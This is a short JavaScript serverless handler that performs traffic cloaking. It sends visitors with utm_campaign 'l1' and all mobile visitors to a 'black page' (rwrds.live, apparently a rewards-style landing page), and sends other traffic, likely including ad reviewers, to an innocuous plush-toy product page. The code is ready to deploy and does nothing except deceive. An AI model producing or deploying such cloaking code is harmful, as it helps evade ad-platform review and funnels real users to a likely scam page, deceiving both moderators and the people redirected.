export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://plushiedepot.com/products/lifelike-plush-blue-whale";
    const blackPageURL = "https://rwrds.live";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic with UTM handling
    if (utmCampaign === 'l1') {
      // Special UTM campaign redirects all traffic to blackPageURL
      res.writeHead(302, { Location: blackPageURL });
    } else if (isMobileDevice) {
      // Redirect mobile devices
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Redirect all other traffic
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
  